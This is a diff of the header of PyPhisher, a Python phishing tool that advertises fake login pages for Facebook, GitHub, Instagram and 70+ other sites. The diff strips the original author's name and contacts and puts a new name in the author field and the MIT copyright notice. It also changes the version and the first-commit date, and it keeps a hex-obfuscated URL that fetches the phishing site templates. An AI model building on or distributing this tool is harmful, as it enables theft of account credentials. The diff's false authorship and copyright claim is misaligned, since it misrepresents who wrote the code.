@@ -1,14 +1,10 @@
 # -*- coding: UTF-8 -*-
 # ToolName   : PyPhisher
-# Author     : KasRoudra
-# Version    : 2.1
-# License    : MIT
-# Copyright  : KasRoudra (2021-2023)
-# Github     : https://github.com/KasRoudra
-# Contact    : https://t.me/KasRoudra
+# Author     : XishAn
+# Version    : 3.1
 # Description: PyPhisher is a phishing tool in python
 # Tags       : Facebook Phishing, Github Phishing, Instagram Phishing and 70+ other sites available
-# 1st Commit : 08/08/2021
+# 1st Commit : 08/08/2023
 # Language   : Python
 # Portable file/script
 # If you copy open source code, consider giving credit
@@ -18,7 +14,7 @@
 """
 MIT License
 
-Copyright (c) 2021-2023 KasRoudra
+Copyright (c) 2021-2023 XishAn
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
@@ -226,7 +222,7 @@ cprint = Console().print
 columns = get_terminal_size().columns
 
 repo_url = "https://github.com/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61/PyPhisher"
-websites_url = f"{repo_url}/releases/download/v{version[:3]}/websites.zip" # "https://github.com/KasRoudra/PyPhisher/releases/latest/download/websites.zip" 
+websites_url = f"{repo_url}/releases/download/v{version[:3]}/websites.zip" # "https://github.com/Xishan/PyPhisher/releases/latest/download/websites.zip" 
 
 # CF = Cloudflared, LX = LocalXpose, LHR = LocalHostRun
 
